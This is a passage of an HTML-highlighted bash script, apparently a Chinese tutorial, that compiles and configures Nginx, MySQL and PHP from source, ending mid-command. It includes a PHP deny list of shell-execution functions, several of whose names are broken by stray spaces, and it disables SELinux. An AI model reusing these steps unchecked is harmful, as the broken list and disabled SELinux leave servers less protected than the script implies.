</span></span><br><span class="line"><span class="meta">#</span><span class="bash">freetype-2.5.3.tar.gz   libvpx-v1.3.0.tar.bz2   php-5.5.14.tar.gz    jpegsrc.v9a.tar.gz      </span></span><br><span class="line"><span class="meta">#</span><span class="bash">mysql-5.6.19.tar.gz     t1lib-5.1.2.tar.gz      libgd-2.1.0.tar.gz   nginx-1.6.0.tar.gz      tiff-4.0.3.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x90E8;&#x7F72;Linux</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x5B89;&#x88C5;&#x76F8;&#x5173;&#x5305;</span></span><br><span class="line">yum install -y apr* autoconf automake bison bzip2 bzip2* compat* cpp curl curl-devel fontconfig fontconfig-devel freetype freetype* freetype-devel gcc gcc-c++ gd gettext gettext-devel glibc kernel kernel-headers keyutils keyutils-libs-devel krb5-devel libcom_err-devel libpng libpng-devel libjpeg* libsepol-devel libselinux-devel libstdc++-devel libtool* libgomp libxml2 libxml2-devel libXpm* libtiff libtiff* make mpfr ncurses* ntp openssl openssl-devel patch pcre-devel perl php-common php-gd policycoreutils telnet t1lib t1lib* nasm nasm* unzip wget zlib-devel</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x5B89;&#x88C5;CMake&#x7F16;&#x8BD1;&#x5DE5;&#x5177;</span></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar xzvf cmake-2.8.11.2.tar.gz</span><br><span class="line">cd cmake-2.8.11.2</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x90E8;&#x7F72;Nginx</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x505C;&#x6389;Apache&#x670D;&#x52A1;</span></span><br><span class="line">systemctl  stop httpd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x5B89;&#x88C5;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x5E93;&#x6587;&#x4EF6;</span></span><br><span class="line">yum install -y  gcc*  zlib  zlib-devel   pcre pcre-devel  openssl  openssl-devel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6267;&#x884C;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8D26;&#x6237;</span></span><br><span class="line">useradd nginx -s /sbin/nologin</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x5B89;&#x88C5;nginx&#x6E90;&#x7801;&#x5305;</span></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar xzvf nginx-1.6.0.tar.gz</span><br><span class="line">cd nginx-1.6.0</span><br><span class="line">./configure  --user=nginx  --group=nginx  --prefix=/usr/local/nginx  --with-http_stub_status_module   --with-http_sub_module   --with-http_ssl_module  --with-pcre</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x8BBE;&#x7F6E;selinux</span></span><br><span class="line">setenforce 0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x914D;&#x7F6E;&#x9632;&#x706B;&#x5899;</span></span><br><span class="line">/sbin/iptables -I INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables-save &gt; /etc/sysconfig/iptables</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">&#x9A8C;&#x8BC1;nginx&#x662F;&#x5426;&#x914D;&#x7F6E;&#x6709;&#x8BEF;</span></span><br><span class="line">/usr/local/nginx/sbin/nginx -t</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x542F;&#x52A8;nginx</span></span><br><span class="line">/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x67E5;&#x770B;nginx&#x8FDB;&#x7A0B;</span></span><br><span class="line">ps -ef|grep nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x90E8;&#x7F72;MySQL</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql&#x7684;&#x7528;&#x6237;</span></span><br><span class="line">useradd mysql -s /sbin/nologin</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x548C;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x628A;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x6240;&#x6709;&#x8005;&#x548C;&#x6240;&#x5C5E;&#x7EC4;&#x8EAB;&#x4EFD;&#x4FEE;&#x6539;&#x4E3A;mysql&#x3002;</span></span><br><span class="line">mkdir -p /usr/local/mysql/var</span><br><span class="line">chown -Rf mysql:mysql /usr/local/mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x89E3;&#x538B;&#x3001;&#x7F16;&#x8BD1;&#x3001;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x5728;&#x7F16;&#x8BD1;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x662F;cmake&#x547D;&#x4EE4;&#xFF0C;&#x5176;&#x4E2D;&#xFF0C;-DCMAKE_INSTALL_PREFIX&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;-DMYSQL_DATADIR&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;-DSYSCONFDIR&#x5219;&#x662F;&#x5B9A;&#x4E49;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x3002;</span></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar xzvf mysql-5.6.19.tar.gz</span><br><span class="line">cd mysql-5.6.19</span><br><span class="line">cmake . -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/usr/local/mysql/var -DSYSCONFDIR=/etc</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x4E3A;&#x4E86;&#x8BA9;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#x8D77;&#x6765;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5220;&#x9664;/etc&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;scripts&#x5185;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql_install_db&#x7684;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5E76;&#x4F7F;&#x7528;--user&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7684;&#x5BF9;&#x5E94;&#x8D26;&#x53F7;&#x540D;&#x79F0;&#xFF08;&#x5728;&#x524D;&#x9762;&#x6B65;&#x9AA4;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#xFF09;&#xFF0C;&#x4F7F;&#x7528;--basedir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528;--datadir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x6837;&#x5373;&#x53EF;&#x751F;&#x6210;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4F1A;&#x751F;&#x6210;&#x51FA;&#x65B0;&#x7684;MySQL&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;</span></span><br><span class="line">rm -rf /etc/my.cnf</span><br><span class="line">cd /usr/local/mysql</span><br><span class="line">./scripts/mysql_install_db --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/var</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x628A;&#x7CFB;&#x7EDF;&#x65B0;&#x751F;&#x6210;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x5230;/etc&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x901A;&#x8FC7;service&#x547D;&#x4EE4;&#x6765;&#x7BA1;&#x7406;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#xFF0C;&#x628A;&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x4FEE;&#x6539;&#x6210;755&#x4EE5;&#x4FBF;&#x4E8E;&#x8BA9;&#x7528;&#x6237;&#x6709;&#x6267;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x6743;&#x9650;&#x3002;</span></span><br><span class="line">ln -s my.cnf /etc/my.cnf </span><br><span class="line">cp ./support-files/mysql.server /etc/rc.d/init.d/mysqld</span><br><span class="line">chmod 755 /etc/rc.d/init.d/mysqld</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x7F16;&#x8F91;&#x521A;&#x521A;&#x590D;&#x5236;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;46&#x3001;47&#x884C;&#x7684;basedir&#x4E0E;datadir&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;&#x4E3A;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x548C;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x3002;</span></span><br><span class="line">sed -i &apos;46d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;45 abasedir=/usr/local/mysql&apos; /etc/rc.d/init.d/mysqld </span><br><span class="line">sed -i &apos;47d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;46 adatadir=/usr/local/mysql/var&apos; /etc/rc.d/init.d/mysqld</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x542F;&#x52A8;MySQL,&#x628A;mysqld&#x52A0;&#x5165;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002;</span></span><br><span class="line">service mysqld start</span><br><span class="line">chkconfig mysqld on</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x8BBE;&#x7F6E;PATH&#x53D8;&#x91CF;</span></span><br><span class="line">sed -i &apos;74d&apos; /etc/profile &amp;&amp; sed -i &apos;73 aexport PATH=$PATH:/usr/local/mysql/bin&apos; /etc/profile</span><br><span class="line">source /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x521B;&#x5EFA;MySQL&#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x76EE;&#x5F55;</span></span><br><span class="line">mkdir /var/lib/mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x94FE;&#x63A5;&#x6587;&#x4EF6;</span></span><br><span class="line">ln -s /usr/local/mysql/lib/mysql /usr/lib/mysql</span><br><span class="line">ln -s /tmp/mysql.sock /var/lib/mysql/mysql.sock</span><br><span class="line">ln -s /usr/local/mysql/include/mysql /usr/include/mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x90E8;&#x7F72;PHP</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x5B89;&#x88C5;&#x76F8;&#x5173;&#x6E90;&#x7801;&#x5305;</span></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar zxvf yasm-1.2.0.tar.gz</span><br><span class="line">cd yasm-1.2.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar zxvf libmcrypt-2.5.8.tar.gz</span><br><span class="line">cd libmcrypt-2.5.8</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar xjvf libvpx-v1.3.0.tar.bz2</span><br><span class="line">cd libvpx-v1.3.0</span><br><span class="line">./configure --prefix=/usr/local/libvpx --enable-shared --enable-vp9</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar zxvf tiff-4.0.3.tar.gz</span><br><span class="line">cd tiff-4.0.3</span><br><span class="line">./configure --prefix=/usr/local/tiff --enable-shared</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar zxvf libpng-1.6.12.tar.gz</span><br><span class="line">cd libpng-1.6.12</span><br><span class="line">./configure --prefix=/usr/local/libpng --enable-shared</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar zxvf freetype-2.5.3.tar.gz</span><br><span class="line">cd freetype-2.5.3</span><br><span class="line">./configure --prefix=/usr/local/freetype --enable-shared</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar zxvf jpegsrc.v9a.tar.gz</span><br><span class="line">cd jpeg-9a</span><br><span class="line">./configure --prefix=/usr/local/jpeg --enable-shared</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar zxvf libgd-2.1.0.tar.gz</span><br><span class="line">cd libgd-2.1.0</span><br><span class="line">./configure --prefix=/usr/local/libgd --enable-shared --with-jpeg=/usr/local/jpeg --with-png=/usr/local/libpng --with-freetype=/usr/local/freetype --with-fontconfig=/usr/local/freetype --with-xpm=/usr/ --with-tiff=/usr/local/tiff --with-vpx=/usr/local/libvpx</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar zxvf t1lib-5.1.2.tar.gz</span><br><span class="line">cd t1lib-5.1.2</span><br><span class="line">./configure --prefix=/usr/local/t1lib --enable-shared</span><br><span class="line">make without_doc &amp;&amp; make install</span><br><span class="line">ln -s /usr/lib64/libltdl.so /usr/lib/libltdl.so</span><br><span class="line">cp -frp /usr/lib64/libXpm.so* /usr/lib/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x6B64;&#x65F6;&#x7EC8;&#x4E8E;&#x628A;&#x7F16;&#x8BD1;php&#x670D;&#x52A1;&#x6E90;&#x7801;&#x5305;&#x7684;&#x76F8;&#x5173;&#x8F6F;&#x4EF6;&#x5305;&#x90FD;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x90E8;&#x7F72;&#x59A5;&#x5F53;&#x4E86;&#x3002;&#x5728;&#x5F00;&#x59CB;&#x7F16;&#x8BD1;php&#x6E90;&#x7801;&#x5305;&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;LD_LIBRARY_PATH&#x7684;&#x5168;&#x5C40;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF0C;&#x8BE5;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x5E2E;&#x52A9;&#x7CFB;&#x7EDF;&#x627E;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x662F;&#x7F16;&#x8BD1;php&#x670D;&#x52A1;&#x6E90;&#x7801;&#x5305;&#x7684;&#x5FC5;&#x987B;&#x5143;&#x7D20;&#x4E4B;&#x4E00;&#x3002;&#x7F16;&#x8BD1;php&#x670D;&#x52A1;&#x6E90;&#x7801;&#x5305;&#x65F6;&#xFF0C;&#x9664;&#x4E86;&#x5B9A;&#x4E49;&#x8981;&#x5B89;&#x88C5;&#x5230;&#x7684;&#x76EE;&#x5F55;&#x4EE5;&#x5916;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x4F9D;&#x6B21;&#x5B9A;&#x4E49;&#x914D;&#x7F6E;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x3001;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x3001;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x76EE;&#x5F55;&#xFF0C;&#x4EE5;&#x53CA;libpng&#x3001;jpeg&#x3001;freetype&#x3001;libvpx&#x3001;zlib&#x3001;t1lib&#x7B49;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x88C5;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;&#x53C2;&#x6570;&#x542F;&#x52A8;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8BF8;&#x591A;&#x9ED8;&#x8BA4;&#x529F;&#x80FD;&#x3002;</span></span><br><span class="line">cd /usr/local/src</span><br><span class="line">tar -zvxf php-5.5.14.tar.gz</span><br><span class="line">cd php-5.5.14</span><br><span class="line">export LD_LIBRARY_PATH=/usr/local/libgd/lib</span><br><span class="line">./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --with-mysql=/usr/local/mysql --with-mysqli=/usr/local/mysql/bin/mysql_config --with-mysql-sock=/tmp/mysql.sock --with-pdo-mysql=/usr/local/mysql --with-gd --with-png-dir=/usr/local/libpng --with-jpeg-dir=/usr/local/jpeg --with-freetype-dir=/usr/local/freetype --with-xpm-dir=/usr/ --with-vpx-dir=/usr/local/libvpx/ --with-zlib-dir=/usr/local/zlib --with-t1lib=/usr/local/t1lib --with-iconv --enable-libxml --enable-xml --enable-bcmath --enable-shmop --enable-sysvsem --enable-inline-optimization --enable-opcache --enable-mbregex --enable-fpm --enable-mbstring --enable-ftp --enable-gd-native-ttf --with-openssl --enable-pcntl --enable-sockets --with-xmlrpc --enable-zip --enable-soap --without-pear --with-gettext --enable-session --with-mcrypt --with-curl --enable-ctype</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x5728;php&#x6E90;&#x7801;&#x5305;&#x7A0B;&#x5E8F;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x5220;&#x9664;&#x5F53;&#x524D;&#x9ED8;&#x8BA4;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5C06;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x76F8;&#x5E94;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x8FC7;&#x6765;&#x3002;</span></span><br><span class="line">rm -rf /etc/php.ini</span><br><span class="line">ln -s /usr/local/php/etc/php.ini /etc/php.ini</span><br><span class="line">cp php.ini-production /usr/local/php/etc/php.ini</span><br><span class="line">cp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf</span><br><span class="line">ln -s /usr/local/php/etc/php-fpm.conf /etc/php-fpm.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">php-fpm.conf&#x662F;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x91CD;&#x8981;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E4B;&#x4E00;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x542F;&#x7528;&#x8BE5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7B2C;25&#x884C;&#x7684;pid&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x5206;&#x522B;&#x5C06;&#x7B2C;148&#x548C;149&#x884C;&#x7684;user&#x4E0E;group&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;&#x4E3A;nginx&#x8D26;&#x6237;&#x548C;&#x7528;&#x6237;&#x7EC4;&#x540D;&#x79F0;&#x3002;</span></span><br><span class="line">sed -i &apos;25d&apos; /usr/local/php/etc/php-fpm.conf &amp;&amp; sed -i &apos;24 apid = run/php-fpm.pid&apos; /usr/local/php/etc/php-fpm.conf </span><br><span class="line">sed -i &apos;148d&apos; /usr/local/php/etc/php-fpm.conf &amp;&amp; sed -i &apos;147 auser = nginx&apos; /usr/local/php/etc/php-fpm.conf</span><br><span class="line">sed -i &apos;149d&apos; /usr/local/php/etc/php-fpm.conf &amp;&amp; sed -i &apos;148 agroup = nginx&apos; /usr/local/php/etc/php-fpm.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x914D;&#x7F6E;&#x59A5;&#x5F53;&#x540E;&#x4FBF;&#x53EF;&#x628A;&#x7528;&#x4E8E;&#x7BA1;&#x7406;php&#x670D;&#x52A1;&#x7684;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x4E2D;&#x4E86;&#x3002;&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x8BF7;&#x8BB0;&#x5F97;&#x4E3A;&#x811A;&#x672C;&#x8D4B;&#x4E88;755&#x6743;&#x9650;&#xFF0C;&#x6700;&#x540E;&#x628A;php-fpm&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x52A0;&#x5165;&#x5230;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002;</span></span><br><span class="line">cp /usr/local/src/php-5.5.14/sapi/fpm/init.d.php-fpm /etc/rc.d/init.d/php-fpm</span><br><span class="line">chmod 755 /etc/rc.d/init.d/php-fpm</span><br><span class="line">chkconfig php-fpm on</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x7981;&#x7528;&#x9AD8;&#x5371;&#x529F;&#x80FD;</span></span><br><span class="line">sed -i &apos;305d&apos; /usr/local/php/etc/php.ini &amp;&amp; sed -i &apos;304 adisable_functions = passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restor e,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,escapeshellcmd,dll,popen,disk_free_space,checkdnsrr,checkdnsrr,g etservbyname,getservbyport,disk_total_space,posix_ctermid,posix_get_last_error,posix_getcwd,posix_getegid,posix_geteuid,posix_getgid,po six_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_getpwnam,posix_ getpwuid,posix_getrlimit,posix_getsid,posix_getuid,posix_isatty,posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,posix_ setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname&apos; /usr/local/php/etc/php.ini</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x8FD9;&#x6837;&#x5C31;&#x628A;php&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x914D;&#x7F6E;&#x59A5;&#x5F53;&#x4E86;&#x3002;&#x6700;&#x540E;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x7F16;&#x8F91;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4E3B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;2&#x884C;&#x7684;&#x4E95;&#x53F7;&#xFF08;<span class="comment">#&#xFF09;&#x5220;&#x9664;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x540E;&#x9762;&#x5199;&#x4E0A;&#x8D1F;&#x8D23;&#x8FD0;&#x884C;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8D26;&#x6237;&#x540D;&#x79F0;&#x548C;&#x7528;&#x6237;&#x7EC4;&#x540D;&#x79F0;&#xFF1B;&#x5728;&#x7B2C;45&#x884C;&#x7684;index&#x53C2;&#x6570;&#x540E;&#x9762;&#x5199;&#x4E0A;&#x7F51;&#x7AD9;&#x7684;&#x9996;&#x9875;&#x540D;&#x79F0;&#x3002;&#x6700;&#x540E;&#x662F;&#x5C06;&#x7B2C;65&#xFF5E;71&#x884C;&#x53C2;&#x6570;&#x524D;&#x7684;&#x4E95;&#x53F7;&#xFF08;#&#xFF09;&#x5220;&#x9664;&#x6765;&#x542F;&#x7528;&#x53C2;&#x6570;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4FEE;&#x6539;&#x7B2C;69&#x884C;&#x7684;&#x811A;&#x672C;&#x540D;&#x79F0;&#x8DEF;&#x5F84;&#x53C2;&#x6570;&#xFF0C;&#x5176;&#x4E2D;$document_root&#x53D8;&#x91CF;&#x5373;&#x4E3A;&#x7F51;&#x7AD9;&#x4FE1;&#x606F;&#x5B58;&#x50A8;&#x7684;&#x6839;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;&#xFF0C;&#x82E5;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x8BE5;&#x53D8;&#x91CF;&#xFF0C;&#x5219;Nginx&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x65E0;&#x6CD5;&#x627E;&#x5230;&#x7F51;&#x7AD9;&#x4FE1;&#x606F;&#xFF0C;&#x56E0;&#x6B64;&#x4F1A;&#x63D0;&#x793A;&#x201C;404&#x9875;&#x9762;&#x672A;&#x627E;&#x5230;&#x201D;&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x3002;&#x5728;&#x786E;&#x8BA4;&#x53C2;&#x6570;&#x4FE1;&#x606F;&#x586B;&#x5199;&#x6B63;&#x786E;&#x540E;&#x4FBF;&#x53EF;&#x91CD;&#x542F;Nginx&#x670D;&#x52A1;&#x4E0E;php-fpm&#x670D;&#x52A1;&#x3002;</span></span></span><br><span class="line">sed -i &apos;2d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;1 auser nginx nginx;&apos; /usr/local/nginx/conf/nginx.conf </span><br><span class="line">sed -i &apos;45d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;44 aindex index.html index.htm index.php;&apos; /usr/local/nginx/conf/nginx.conf </span><br><span class="line">sed -i &apos;65d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;64 alocation ~ \.php$ {&apos; /usr/local/nginx/conf/nginx.conf </span><br><span class="line">sed -i &apos;66d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;65 aroot html;&apos; /usr/local/nginx/conf/nginx.conf </span><br><span class="line">sed -i &apos;67d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;66 afastcgi_pass 127.0.0.1:9000;&apos; /usr/local/nginx/conf/nginx.conf </span><br><span class="line">sed -i &apos;68d&apos; 